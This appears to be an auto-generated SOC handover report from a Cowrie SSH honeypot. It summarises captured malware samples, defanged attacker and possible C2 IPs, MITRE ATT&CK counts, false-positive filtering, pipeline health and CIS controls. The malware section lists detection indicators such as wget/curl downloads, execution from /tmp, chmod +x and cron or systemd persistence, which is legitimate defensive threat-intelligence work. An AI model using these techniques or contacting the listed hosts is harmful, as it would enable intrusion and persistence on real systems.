| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `222.96.89[.]220` | KR | Korea Telecom | **100** ⚠️ | 2 |
| `89.21.67[.]178` | NL | Infrawatch Limited | **100** ⚠️ | 50 |
| `59.28.174[.]77` | KR | Korea Telecom | **100** ⚠️ | 9 |
| `175.195.238[.]137` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `194.92.50[.]86` | PL | MAGIC GATE KONRAD DZIANOK | **100** ⚠️ | 0 |
| `77.239.124[.]130` | NL | ROCKET & MARINICA LTD | **100** ⚠️ | 50 |
| `193.8.186[.]29` | GB | Vlad Cojuhari | **100** ⚠️ | 50 |
| `91.134.133[.]184` | FR | OVH SAS | **100** ⚠️ | 50 |
| `92.118.39[.]50` | RO | DMZHOST | **100** ⚠️ | 50 |
| `94.154.43[.]69` | NL | Storm Industries LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 242 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 199 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 71 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 70 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 11 |

---

## 🔕 False Positive Summary (51 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 17 |
| AbuseIPDB score 15 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 2 |
| AbuseIPDB score 20 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 4 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 23 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 390 cases |
| Tool 34  | Credential Extractor        | ✅ 14268 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 27 fingerprints |
| Tool 36  | Command Clustering          | ✅ 18 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 226 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 51 filtered (13.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 100 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 28 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 195 priority case(s) shown individually · 126 recon entry/entries in table (15 group(s) consolidating 33 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-08T18:10:59Z_
